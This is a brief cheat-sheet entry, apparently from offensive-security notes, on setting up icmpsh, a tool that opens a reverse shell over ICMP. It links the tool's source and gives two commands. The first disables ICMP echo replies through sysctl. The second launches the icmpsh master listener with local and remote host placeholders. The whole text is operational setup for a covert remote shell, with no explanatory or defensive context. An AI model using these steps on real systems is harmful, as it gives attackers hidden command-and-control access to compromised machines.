### Soure 
https://github.com/bdamele/icmpsh  

### Disable echo reply
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1
```

### Start listener
```
python2 icmpsh_m.py <lhost> <rhost>
```

